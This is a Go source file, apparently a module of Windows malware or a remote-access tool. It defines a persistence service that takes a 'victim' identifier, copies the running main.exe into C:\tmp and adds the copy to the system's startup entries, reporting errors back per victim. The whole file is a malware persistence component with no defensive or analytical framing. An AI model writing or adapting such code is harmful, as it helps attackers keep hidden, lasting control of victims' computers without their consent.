package services

import (
	"fmt"
	"main/utils"
	"os"
)

const ExeFileLocation = ".\\main.exe"

type PersistService struct{}

func (serv *PersistService) Run(victim string) {
	oldLocation := ExeFileLocation
	newLocation := "C:\\tmp"
	if _, err := os.Stat(newLocation); os.IsNotExist(err) {
		err := os.Mkdir(newLocation, 0666)
		if err != nil {
			utils.HandleError(err.Error(), victim)
			fmt.Println(err.Error())
			return
		}
	}
	file, err := utils.CopyFile(oldLocation, newLocation, utils.FILENAME)
	if err != nil {
		utils.HandleError(err.Error(), victim)
	}
	err = utils.AddToStartup(file)
	if err != nil {
		utils.HandleError(err.Error(), victim)
	}
}
